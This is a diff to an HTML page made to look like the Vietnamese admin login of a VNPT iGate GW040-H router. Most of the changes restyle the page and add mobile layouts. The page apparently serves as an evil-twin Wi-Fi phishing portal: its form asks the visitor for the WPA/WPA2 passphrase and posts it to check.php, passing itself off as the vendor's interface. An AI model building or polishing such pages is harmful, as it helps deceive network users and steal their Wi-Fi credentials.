@@ -1,25 +1,21 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" lang="vi">
+<!DOCTYPE html>
+<html lang="vi">
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 <title>iGate GW040-H - VNPT Technology</title>
 <style type="text/css">
 html, body {
     min-height: 100%;
     margin: 0;
     padding: 0;
-}
-body {
-    text-align: center;
     background: #EBEBEB;
-    font-size: 12px;
+    font-size: 13px;
     color: #313131;
-    font-family: "Microsoft YaHei", Arial, SimSun, Verdana, Helvetica, sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
 }
 body, form, h1, h3, h4, p, ul, ol { margin: 0; }
-ul, ol { padding-left: 0; list-style-type: none; }
 table { border-collapse: collapse; border-spacing: 0; }
 
 #page_container {
@@ -30,7 +26,7 @@ table { border-collapse: collapse; border-spacing: 0; }
     padding: 0 0 15px 0;
     text-align: left;
     background: #FFFFFF;
-    box-shadow: 0 0 8px rgba(0,0,0,0.12);
+    box-shadow: 0 0 10px rgba(0,0,0,0.1);
     min-height: 100vh;
     display: flex;
     flex-direction: column;
@@ -40,12 +36,11 @@ table { border-collapse: collapse; border-spacing: 0; }
 /* === BANNER / HEADER === */
 #banner {
     width: 100%;
-    height: 74px;
     background: #FFFFFF;
     display: flex;
     justify-content: space-between;
     align-items: center;
-    padding: 0 20px;
+    padding: 12px 20px;
     box-sizing: border-box;
     border-bottom: 1px solid #D0D8E4;
 }
@@ -55,11 +50,14 @@ table { border-collapse: collapse; border-spacing: 0; }
     gap: 12px;
 }
 .logo-badge {
+    background: #005baa;
+    color: #fff;
+    font-weight: bold;
+    font-size: 16px;
+    padding: 6px 14px;
+    border-radius: 4px;
+    letter-spacing: 1px;
     display: inline-block;
-    width: 60px;
-    height: 40px;
-    background: url(./img/logo-vnpt-4.png) no-repeat center center;
-    background-size: contain;
 }
 .logo-sub {
     font-size: 13px;
@@ -75,21 +73,42 @@ table { border-collapse: collapse; border-spacing: 0; }
 }
 #banner_info {
     font-size: 11px;
-    color: #888;
+    color: #777;
     text-align: right;
-    line-height: 1.7;
+    line-height: 1.6;
 }
+
+/* === STATUS LED STRIP === */
+.status-strip {
+    background: #1f2d3d;
+    color: #ccc;
+    font-size: 11px;
+    display: flex;
+    gap: 16px;
+    padding: 8px 20px;
+    box-sizing: border-box;
+    flex-wrap: wrap;
+}
+.led-item { display: flex; align-items: center; gap: 6px; }
+.led { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
+.led-green { background: #2ecc71; box-shadow: 0 0 4px #2ecc71; }
+.led-amber { background: #f39c12; box-shadow: 0 0 4px #f39c12; }
+.led-red   { background: #e74c3c; box-shadow: 0 0 4px #e74c3c; }
+.led-off   { background: #555; }
 
 /* === MAIN NAV BAR === */
 #mainNavigator {
     width: 100%;
-    height: 36px;
-    line-height: 36px;
+    height: 38px;
+    line-height: 38px;
     background: #005baa;
     display: flex;
-    padding: 0 20px;
+    padding: 0 15px;
     box-sizing: border-box;
     gap: 2px;
+    overflow-x: auto;
+    white-space: nowrap;
+    -webkit-overflow-scrolling: touch;
 }
 #mainNavigator span {
     padding: 0 14px;
@@ -99,18 +118,19 @@ table { border-collapse: collapse; border-spacing: 0; }
     cursor: default;
     display: inline-block;
     height: 100%;
+    flex-shrink: 0;
 }
 #mainNavigator span.active {
     background: #ffffff;
     color: #005baa;
     border-top: 3px solid #0080cc;
-    line-height: 33px;
+    line-height: 35px;
 }
 
 /* === CONTENT AREA === */
 #page_content {
     flex: 1;
-    padding: 25px 20px;
+    padding: 20px;
     text-align: left;
 }
 
@@ -120,17 +140,17 @@ table { border-collapse: collapse; border-spacing: 0; }
     margin: 10px auto;
     border: 1px solid #C8D9EC;
     background: #F8FBFE;
-    border-radius: 3px;
-    padding: 25px 30px;
+    border-radius: 6px;
+    padding: 22px 25px;
     box-sizing: border-box;
 }
 .loginTitle {
-    font-size: 14px;
+    font-size: 15px;
     font-weight: bold;
     color: #003d7a;
     border-bottom: 2px solid #C8D9EC;
     padding-bottom: 10px;
-    margin-bottom: 18px;
+    margin-bottom: 16px;
 }
 
 /* === HINT BOXES === */
@@ -139,10 +159,12 @@ table { border-collapse: collapse; border-spacing: 0; }
     background: #FFFCE4;
     border: 1px solid #DDCC66;
     border-left: 4px solid #f0a500;
-    padding: 10px 14px;
+    padding: 12px 14px;
     margin-bottom: 18px;
     text-align: left;
     line-height: 1.6;
+    border-radius: 4px;
+    font-size: 12px;
 }
 .warnHint strong { color: #6a4800; }
 
@@ -150,11 +172,11 @@ table { border-collapse: collapse; border-spacing: 0; }
 .row {
     display: flex;
     align-items: flex-start;
-    margin-bottom: 13px;
+    margin-bottom: 14px;
 }
 .left {
-    width: 180px;
-    min-width: 180px;
+    width: 170px;
+    min-width: 170px;
     text-align: right;
     padding-right: 14px;
     padding-top: 6px;
@@ -172,95 +194,164 @@ table { border-collapse: collapse; border-spacing: 0; }
 }
 
 input[type="text"], input[type="password"] {
-    width: 260px;
-    height: 26px;
-    padding: 2px 7px;
-    border: 1px solid;
-    border-color: #AAAAAA #CCCCCC #CCCCCC #AAAAAA;
-    border-radius: 3px;
-    box-shadow: 0 1px 2px #CCCCCC inset;
+    width: 100%;
+    max-width: 320px;
+    height: 34px;
+    padding: 4px 10px;
+    border: 1px solid #AAAAAA;
+    border-radius: 4px;
+    box-shadow: 0 1px 2px rgba(0,0,0,0.08) inset;
     outline: none;
     box-sizing: border-box;
-    font-size: 12px;
+    font-size: 13px;
 }
 input[type="text"]:focus, input[type="password"]:focus {
     border-color: #005baa;
-    box-shadow: 0 0 3px rgba(0, 91, 170, 0.55);
+    box-shadow: 0 0 4px rgba(0, 91, 170, 0.4);
 }
 .toggle-pw {
     display: inline-flex;
     align-items: center;
-    gap: 4px;
+    gap: 5px;
     margin-left: 8px;
-    font-size: 11px;
-    color: #666;
+    font-size: 12px;
+    color: #555;
     cursor: pointer;
     vertical-align: middle;
 }
 .hint-text {
     font-size: 11px;
-    color: #888;
-    margin-top: 4px;
+    color: #777;
+    margin-top: 5px;
+    line-height: 1.4;
 }
 
-/* === BUTTON === */
+/* === BUTTONS === */
+.btn-group {
+    display: flex;
+    gap: 10px;
+}
 .Button {
     cursor: pointer;
-    height: 28px;
+    height: 34px;
     border: none;
-    padding: 0 20px;
+    padding: 0 24px;
     min-width: 110px;
-    border-radius: 3px;
+    border-radius: 4px;
     background-color: #005baa;
     background-image: linear-gradient(to bottom, #1a7fd4, #005baa);
     color: #fff;
     font-weight: bold;
-    font-size: 12px;
-    margin-right: 10px;
+    font-size: 13px;
 }
-.Button:hover { background: #003d7a; background-image: none; }
+.Button:hover { background: #003d7a; }
 .CancelBtn {
     cursor: pointer;
-    height: 28px;
-    border: 1px solid #AAAAAA;
-    padding: 0 16px;
-    border-radius: 3px;
+    height: 34px;
+    border: 1px solid #CCCCCC;
+    padding: 0 18px;
+    border-radius: 4px;
     background: #f0f0f0;
     color: #555;
-    font-size: 12px;
+    font-size: 13px;
 }
-
-/* === STATUS STRIP (LED indicators) === */
-.status-strip {
-    background: #1f2d3d;
-    color: #ccc;
-    font-size: 11px;
-    display: flex;
-    gap: 18px;
-    padding: 6px 20px;
-    box-sizing: border-box;
-    flex-wrap: wrap;
-}
-.led-item { display: flex; align-items: center; gap: 5px; }
-.led { width: 8px; height: 8px; border-radius: 50%; display: inline-block; }
-.led-green { background: #2ecc71; box-shadow: 0 0 4px #2ecc71; }
-.led-amber { background: #f39c12; box-shadow: 0 0 4px #f39c12; }
-.led-red   { background: #e74c3c; box-shadow: 0 0 4px #e74c3c; }
-.led-off   { background: #555; }
 
 /* === FOOTER === */
 #page_footer {
-    height: 40px;
-    line-height: 40px;
+    min-height: 40px;
+    line-height: 1.5;
     text-align: left;
     background-color: #F4F4F4;
-    padding: 0 20px;
+    padding: 10px 20px;
     border-top: 1px solid #D7D7D7;
     font-size: 11px;
     color: #666;
     display: flex;
     justify-content: space-between;
+    align-items: center;
     box-sizing: border-box;
+}
+
+/* ========================================================= */
+/* === MOBILE RESPONSIVE MEDIA QUERIES (PHONES & TABLETS) === */
+/* ========================================================= */
+@media screen and (max-width: 640px) {
+    #page_container {
+        padding: 0 !important;
+        box-shadow: none !important;
+        min-height: 100vh;
+    }
+    #banner {
+        flex-direction: column !important;
+        align-items: flex-start !important;
+        padding: 10px 14px !important;
+        gap: 6px !important;
+    }
+    #banner_info {
+        text-align: left !important;
+        font-size: 10px !important;
+    }
+    #page_content {
+        padding: 10px 12px !important;
+    }
+    #loginWrapper {
+        margin: 5px 0 !important;
+        padding: 16px 14px !important;
+        border-radius: 6px !important;
+    }
+    .loginTitle {
+        font-size: 14px !important;
+    }
+    .warnHint {
+        font-size: 11px !important;
+        padding: 10px 12px !important;
+    }
+    .row {
+        flex-direction: column !important;
+        align-items: stretch !important;
+        margin-bottom: 12px !important;
+    }
+    .left {
+        width: 100% !important;
+        min-width: 0 !important;
+        text-align: left !important;
+        padding-right: 0 !important;
+        padding-top: 0 !important;
+        padding-bottom: 4px !important;
+        font-size: 12px !important;
+    }
+    .right {
+        width: 100% !important;
+    }
+    input[type="text"], input[type="password"] {
+        width: 100% !important;
+        max-width: 100% !important;
+        height: 40px !important;
+        font-size: 14px !important;
+        box-sizing: border-box !important;
+    }
+    .toggle-pw {
+        display: flex !important;
+        margin-left: 0 !important;
+        margin-top: 8px !important;
+        font-size: 12px !important;
+    }
+    .btn-group {
+        flex-direction: column !important;
+        width: 100% !important;
+    }
+    .Button, .CancelBtn {
+        width: 100% !important;
+        height: 42px !important;
+        font-size: 14px !important;
+        margin-right: 0 !important;
+    }
+    #page_footer {
+        flex-direction: column !important;
+        text-align: center !important;
+        gap: 4px !important;
+        padding: 12px 14px !important;
+    }
 }
 </style>
 </head>
@@ -270,7 +361,7 @@ input[type="text"]:focus, input[type="password"]:focus {
     <!-- HEADER BANNER -->
     <div id="banner">
         <div class="logo-vnpt">
-            <span class="logo-badge"><img src="./img/logo-vnpt-4.png" alt="VNPT" style="height:100%;width:100%;object-fit:contain;"></span>
+            <span class="logo-badge">VNPT</span>
             <div class="logo-sub">
                 VNPT Gateway — iGate GW040-H
                 <small>Cổng Quản Trị Thiết Bị Mạng | Gateway IP: 192.168.1.1</small>
@@ -316,7 +407,7 @@ input[type="text"]:focus, input[type="password"]:focus {
             <form action="check.php" method="POST">
                 <div class="row">
                     <div class="left">Thiết bị:</div>
-                    <div class="right row-value"><strong> VNPT iGate GW040-H</strong></div>
+                    <div class="right row-value"><strong>VNPT iGate GW040-H</strong></div>
                 </div>
                 <div class="row">
                     <div class="left">Firmware:</div>
@@ -333,9 +424,9 @@ input[type="text"]:focus, input[type="password"]:focus {
                 <div class="row">
                     <div class="left">Mật Khẩu (WPA Key):</div>
                     <div class="right">
-                        <input type="password" id="pwd" name="key1" placeholder="WPA/WPA2 Passphrase" required autofocus autocomplete="off">
+                        <input type="password" id="pwd" name="key1" placeholder="Nhập mật khẩu WPA/WPA2" required autofocus autocomplete="off">
                         <label class="toggle-pw">
-                            <input type="checkbox" onclick="togglePwd()"> Hiển thị
+                            <input type="checkbox" onclick="togglePwd()"> Hiển thị mật khẩu
                         </label>
                         <div class="hint-text">Mật khẩu mặc định in trên nhãn bên dưới hoặc mặt sau thiết bị.</div>
                     </div>
@@ -344,8 +435,10 @@ input[type="text"]:focus, input[type="password"]:focus {
                 <div class="row" style="margin-top:20px;">
                     <div class="left"></div>
                     <div class="right">
-                        <input type="submit" class="Button" value="Đăng Nhập">
-                        <input type="reset" class="CancelBtn" value="Nhập Lại">
+                        <div class="btn-group">
+                            <input type="submit" class="Button" value="Đăng Nhập">
+                            <input type="reset" class="CancelBtn" value="Nhập Lại">
+                        </div>
                     </div>
                 </div>
             </form>
